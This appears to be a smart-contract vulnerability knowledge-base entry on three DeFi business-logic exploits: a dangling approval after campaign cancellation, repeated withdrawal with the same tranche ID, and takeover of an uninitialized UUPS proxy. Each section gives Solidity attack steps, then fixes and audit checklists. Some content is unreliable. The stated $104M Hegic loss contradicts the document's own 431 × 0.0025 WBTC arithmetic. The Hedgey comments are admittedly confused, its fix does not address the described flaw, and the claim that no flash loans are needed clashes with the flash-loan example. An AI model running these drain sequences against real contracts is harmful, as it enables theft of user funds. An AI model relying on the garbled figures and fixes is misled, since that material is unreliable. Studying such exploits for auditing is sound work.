---
# Core Classification
protocol: "generic"
chain: "ethereum, arbitrum"
category: "business_logic"
vulnerability_type: "dangling_approval, repeated_withdrawal, uninitialized_proxy"

# Pattern Identity (Required)
root_cause_family: stale_accounting
pattern_key: dangling_approval | campaign_lifecycle | logical_error | fund_loss

# Interaction Scope
interaction_scope: single_contract

# Attack Vector Details
attack_type: "logical_error"
affected_component: "campaign_lifecycle, tranche_state, proxy_initialization"

# Technical Primitives
primitives:
  - "dangling_approval"
  - "create_cancel_approve"
  - "repeated_withdrawal"
  - "tranche_not_invalidated"
  - "uninitialized_uups_proxy"
  - "upgradeToAndCall"
  - "insolvency_check"
  - "campaign_cancellation"
  - "approval_lifecycle"

# Impact Classification
severity: "critical"
impact: "fund_loss"
exploitability: 0.85
financial_impact: "critical"

# Grep / Hunt-Card Seeds (Required)
code_keywords:
  - "_burn"
  - "cancel"
  - "create"
  - "redeem"
  - "refund"
  - "_burn(id"
  - "withdraw"
  - "approve(0"
  - "withdrawn"
  - "initialize"
  - "transferFrom"
  - "proxiableUUID"
  - "cancelCampaign"
  - "deposit_amount"
  - "_burn(trancheID"
path_keys:
  - "dangling_approval_after_operation_cancellation"
  - "repeated_withdrawal_without_state_invalidation"
  - "uninitialized_uups_proxy_takeover"

# Context Tags
tags:
  - "defi"
  - "business_logic"
  - "approval"
  - "allowance"
  - "campaign"
  - "vesting"
  - "tranche"
  - "withdrawal"
  - "proxy"
  - "uups"
  - "initialization"
  - "options"

# Version Info
language: "solidity"
version: ">=0.8.0"
---

## References

| Tag | Source | Path / URL |
|-----|--------|------------|
| [HEDGEY-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2024-04/HedgeyFinance_exp.sol` |
| [HEGIC-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2025-02/HegicOptions_exp.sol` |
| [PIKE-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2024-04/PikeFinance_exp.sol` |

---

# Business Logic & State Management Attack Patterns (2024-2025)
## Overview

Business logic vulnerabilities exploit flaws in protocol state management — missing state invalidation, dangling approvals after operations, and uninitialized proxy contracts. These attacks are deceptively simple but devastatingly effective, causing over **$153M** in losses during 2024-2025. The three major patterns are: dangling ERC20 approvals after campaign cancellation (HedgeyFinance $48M), repeated withdrawals from non-invalidated tranches (HegicOptions $104M), and uninitialized UUPS proxies allowing ownership takeover (PikeFinance $1.4M).

---


### Agent Quick View

| Field | Value |
|-------|-------|
| Root Cause | `stale_accounting` |
| Pattern Key | `dangling_approval | campaign_lifecycle | logical_error | fund_loss` |
| Severity | CRITICAL |
| Impact | fund_loss |
| Interaction Scope | `single_contract` |
| Chain(s) | ethereum, arbitrum |


## 1. Dangling Approval After Operation Cancellation

> **pathShape**: `callback-reentrant`

### Root Cause

When a protocol's `create` function pulls tokens via `transferFrom()` and stores them, a corresponding `cancel` function may refund the tokens but fail to revoke the ERC20 allowance that was set during creation. After cancellation, the contract retains a lingering approval for the user's tokens. An attacker can create-then-cancel in a flash loan callback, repay the flash loan, then exploit the dangling approval to drain the contract's entire balance of that token.

### Attack Scenario

1. Flash loan the target token (e.g., USDC)
2. Call `createLockedCampaign()` — contract pulls tokens and internally uses them
3. Call `cancelCampaign()` — contract refunds tokens but approval persists
4. Repay flash loan with refunded tokens
5. After callback: call `token.transferFrom(contract, attacker, contract.balance)` using the lingering approval
6. Drain the contract's entire balance (from other users' deposits)

### Vulnerable Pattern Examples

**Example 1: HedgeyFinance — Dangling Approval After Campaign Cancel ($48M, Apr 2024)** [Approx Vulnerability: CRITICAL] `@audit` [HEDGEY-POC]

```solidity
// ❌ VULNERABLE: Approval not revoked when campaign is cancelled
// createLockedCampaign() sets up approval → cancelCampaign() refunds but keeps approval

// Step 1: Flash loan USDC from Balancer
USDC.approve(address(HedgeyFinance), loan);

// Step 2: Create a locked campaign — contract pulls USDC
HedgeyFinance.createLockedCampaign(
    campaign_id,
    campaign,        // Campaign struct with token amounts
    claimLockup,     // Vesting parameters
    donation         // Donation parameters
);
// @audit Contract now holds USDC from flash loan + other users' deposits

// Step 3: Cancel immediately — contract refunds USDC to attacker
HedgeyFinance.cancelCampaign(campaign_id);
// @audit USDC returned to attacker, BUT the approval persists
// Contract still has allowance to pull tokens from... itself?
// OR: the contract retains a stored allowance for the attacker's call pattern

// Step 4: Repay flash loan
USDC.transfer(address(BalancerVault), loan);

// Step 5: Exploit the lingering approval to drain contract
uint256 contractBalance = USDC.balanceOf(address(HedgeyFinance));
USDC.transferFrom(
    address(HedgeyFinance),   // @audit From: the contract itself
    address(this),            // @audit To: attacker
    contractBalance           // @audit Amount: ALL remaining USDC
);
// @audit $48M drained — every user's locked USDC stolen
// Root cause: cancelCampaign() doesn't call approve(0) to revoke allowance
```

---

## 2. Repeated Withdrawal Without State Invalidation

> **pathShape**: `iterative-loop`

### Root Cause

When a withdrawal or redemption function processes a tranche/position but fails to burn, delete, or otherwise invalidate the tranche ID after successful withdrawal, the same ID can be reused to withdraw again. This creates an infinite withdrawal loop where a tiny initial deposit enables draining the entire pool.

### Attack Scenario

1. Deposit a small amount to create a valid tranche/position (e.g., trancheID = 2)
2. Call `withdrawWithoutHedge(trancheID)` — withdraws deposit amount
3. Call `withdrawWithoutHedge(trancheID)` again — same ID still valid
4. Repeat 100-300+ times per transaction — drain entire pool

### Vulnerable Pattern Examples

**Example 2: HegicOptions — Repeated Withdrawal with Same TrancheID ($104M, Feb 2025)** [Approx Vulnerability: CRITICAL] `@audit` [HEGIC-POC]

```solidity
// ❌ VULNERABLE: withdrawWithoutHedge() does NOT invalidate the tranche after withdrawal
// Same trancheID can be used to withdraw unlimited times

interface IHegic_WBTC_ATM_Puts_Pool {
    function withdrawWithoutHedge(uint256 trancheID)
        external returns (uint256 amount);
}

// Step 1: Deposit 0.0025 WBTC to create trancheID = 2
// (Done in setup transaction)

// Step 2: Withdraw using same trancheID — 100 times per transaction
for (uint256 i = 0; i < 100; i++) {
    Hegic_WBTC_ATM_Puts_Pool.withdrawWithoutHedge(2);
    // @audit trancheID 2 is NOT burned or invalidated
    // @audit Each call withdraws the original deposit amount
    // @audit After 100 iterations: 100 × 0.0025 WBTC = 0.25 WBTC
}

// Step 3: Second transaction — 331 more iterations
for (uint256 i = 0; i < 331; i++) {
    Hegic_WBTC_ATM_Puts_Pool.withdrawWithoutHedge(2);
    // @audit Still using the same trancheID = 2
}

// @audit Total: 431 withdrawals × deposit_amount = entire pool drained
// @audit $104M stolen — LARGEST single-protocol exploit in 2025
// Root cause: missing `_burn(trancheID)` or `delete tranche[trancheID]`
```

---

## 3. Uninitialized UUPS Proxy Takeover

> **pathShape**: `linear-multistep`

### Root Cause

UUPS (Universal Upgradeable Proxy Standard) proxies require `initialize()` to be called after deployment to set the owner/admin. If the deployer forgets to call `initialize()`, anyone can call it to become the owner, then use `upgradeToAndCall()` to upgrade the implementation to a malicious contract that drains all funds in the same transaction.

### Attack Scenario

1. Find an uninitialized UUPS proxy (storage slot for owner is zero)
2. Call `initialize()` with attacker's address — become owner
3. Deploy a malicious implementation contract with a `withdraw()` function
4. Call `upgradeToAndCall(maliciousImpl, abi.encodeWithSignature("withdraw(address)", attacker))`
5. In the same transaction: implementation upgrades AND drains all ETH/tokens

### Vulnerable Pattern Examples

**Example 3: PikeFinance — Uninitialized UUPS Proxy ($1.4M, Apr 2024)** [Approx Vulnerability: CRITICAL] `@audit` [PIKE-POC]

```solidity
// ❌ VULNERABLE: UUPS proxy deployed without calling initialize()
// Anyone can call initialize() to become owner, then upgrade to drain funds

// Step 1: Call initialize() — become owner of the proxy
IPikeFinanceProxy(PikeFinanceProxy).initialize(
    address(this),  // @audit Attacker becomes admin/owner
    address(this),  // @audit Attacker controls all roles
    address(this),
    address(this),
    20, 20
);
// @audit Proxy was never initialized after deployment — storage is empty

// Step 2: Deploy malicious implementation + upgrade in same tx
IPikeFinanceProxy(PikeFinanceProxy).upgradeToAndCall(
    address(this),  // @audit New implementation = attacker contract
    abi.encodeWithSignature("withdraw(address)", address(this))
);

// Step 3: Attacker contract drains all ETH
function withdraw(address addr) external {
    payable(addr).call{value: address(this).balance}("");
    // @audit All ETH in proxy drained to attacker
}

// UUPS compliance — must expose proxiableUUID
function proxiableUUID() external pure returns (bytes32) {
    return 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    // @audit Standard EIP-1967 implementation slot
}
// @audit $1.4M ETH drained in 2 function calls
```

---

## Impact Analysis

### Technical Impact
- Dangling approvals allow complete draining of contract token balances
- State non-invalidation enables infinite withdrawal loops
- Uninitialized proxies allow complete contract takeover in a single transaction
- These vulnerabilities require minimal technical sophistication to exploit
- No flash loans, price manipulation, or complex DeFi interactions needed

### Business Impact
- **HegicOptions**: $104M loss — largest business logic exploit, 431 repeated withdrawals
- **HedgeyFinance**: $48M loss — dangling approval after campaign cancellation
- **PikeFinance**: $1.4M loss — 2-function-call proxy takeover
- Combined 2024-2025 business logic damage: **$153M+**

### Affected Scenarios
- Any protocol with create/cancel/refund lifecycle that manages token approvals
- Staking/options/lending protocols with tranche/position-based withdrawal
- UUPS proxy deployments that rely on post-deployment initialization
- Vesting/lockup/campaign contracts with cancellation features
- Option pools with hedge/no-hedge withdrawal variants

---

## Secure Implementation

**Fix 1: Revoke Approval on Campaign Cancellation**
```solidity
// ✅ SECURE: Revoke ALL approvals when campaign is cancelled
function cancelCampaign(bytes16 campaignId) external {
    Campaign storage campaign = campaigns[campaignId];
    require(msg.sender == campaign.creator, "Not creator");

    // Refund tokens
    IERC20(campaign.token).transfer(campaign.creator, campaign.amount);

    // @audit CRITICAL: Revoke any lingering approvals
    IERC20(campaign.token).approve(address(this), 0);

    // @audit Delete campaign to prevent re-cancellation
    delete campaigns[campaignId];

    emit CampaignCancelled(campaignId);
}
```

**Fix 2: Burn/Invalidate Tranche on Withdrawal**
```solidity
// ✅ SECURE: Burn tranche NFT and delete state on withdrawal
function withdrawWithoutHedge(uint256 trancheID) external returns (uint256 amount) {
    require(ownerOf(trancheID) == msg.sender, "Not owner");

    Tranche storage tranche = tranches[trancheID];
    require(!tranche.withdrawn, "Already withdrawn");

    amount = tranche.amount;

    // @audit CRITICAL: Mark as withdrawn AND burn the tranche
    tranche.withdrawn = true;
    _burn(trancheID);  // Permanently invalidates the tranche
    delete tranches[trancheID];  // Clear storage

    IERC20(tranche.token).transfer(msg.sender, amount);

    emit WithdrawalCompleted(trancheID, amount);
}
```

**Fix 3: Initialize in Constructor or Deployment Script**
```solidity
// ✅ SECURE: Use initializer modifier and deploy/init atomically
contract SecureProxy is UUPSUpgradeable, OwnableUpgradeable {
    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();  // @audit Prevents re-initialization
    }

    function initialize(address admin) external initializer {
        __Ownable_init(admin);
        __UUPSUpgradeable_init();
    }

    function _authorizeUpgrade(address newImpl) internal override onlyOwner {}
}

// In deployment script:
// @audit ALWAYS initialize in the same transaction as deployment
address proxy = address(new ERC1967Proxy(
    impl,
    abi.encodeWithSelector(SecureProxy.initialize.selector, adminAddress)
));
```

---

## Detection Patterns

### Code Patterns to Look For
```
- Pattern 1: `cancel()` / `refund()` without `approve(0)` or allowance reset
- Pattern 2: `withdraw()` / `redeem()` without `_burn(id)` or `delete state[id]`
- Pattern 3: UUPS proxy with no `_disableInitializers()` in constructor
- Pattern 4: `initialize()` function that's callable after deployment by anyone
- Pattern 5: Tranche/position ID reusable after withdrawal
- Pattern 6: Campaign lifecycle: create → cancel → lingering state
```

### Audit Checklist
- [ ] Does `cancel()` / `refund()` revoke all ERC20 approvals?
- [ ] Does `withdraw()` / `redeem()` burn or invalidate the position/tranche?
- [ ] Can the same position ID be used for multiple withdrawals?
- [ ] Is the UUPS proxy initialized atomically with deployment?
- [ ] Does the implementation constructor call `_disableInitializers()`?
- [ ] Are all state-changing operations idempotent (safe to call twice)?
- [ ] Is there a `withdrawn` flag + check before processing withdrawals?

---

## Real-World Examples

### Known Exploits
- **HegicOptions** — $104M — withdrawWithoutHedge() reusable with same trancheID — Feb 2025
- **HedgeyFinance** — $48M — Dangling ERC20 approval after campaign cancellation — Apr 2024
- **PikeFinance** — $1.4M — Uninitialized UUPS proxy takeover via initialize() — Apr 2024

---

## Prevention Guidelines

### Development Best Practices
1. Always revoke ERC20 approvals (set to 0) when cancelling/refunding operations
2. Burn or permanently invalidate position/tranche IDs on withdrawal
3. Use double-protection: boolean flag (`withdrawn`) + structural deletion (`_burn`)
4. Initialize UUPS proxies atomically in the deployment transaction
5. Call `_disableInitializers()` in implementation constructors
6. Implement withdrawal nonces to prevent replay of the same withdrawal
7. Test complete lifecycle: create → use → cancel → verify full cleanup

### Testing Requirements
- Unit tests for: create → cancel → verify zero remaining approval
- Unit tests for: withdraw → attempt second withdraw with same ID → must revert
- Integration tests for: proxy deployment → verify initialize() cannot be called by others
- Fuzzing targets: withdrawal function with repeated same-ID calls
- Invariant tests: `withdrawnCount * amount <= totalDeposited` always holds

---

## Keywords for Search

`dangling approval`, `lingering allowance`, `cancel campaign`, `refund approval`, `create cancel exploit`, `repeated withdrawal`, `tranche not invalidated`, `withdrawWithoutHedge`, `trancheID reuse`, `infinite withdrawal`, `state non-invalidation`, `uninitialized proxy`, `UUPS proxy`, `upgradeToAndCall`, `initialize takeover`, `_disableInitializers`, `proxiableUUID`, `business logic flaw`, `campaign lifecycle`, `approval lifecycle`, `position burn`, `ERC20 approve`, `allowance reset`, `withdrawal replay`

---

## Related Vulnerabilities

- `DB/general/business-logic/defihacklabs-solvency-business-logic-patterns.md` — Earlier business logic patterns (2022-2023)
- `DB/general/initialization/defihacklabs-initialization-patterns.md` — Initialization vulnerabilities
- `DB/general/proxy-vulnerabilities/` — Proxy vulnerability patterns
- `DB/general/missing-validations/defihacklabs-input-validation-patterns.md` — Input validation patterns
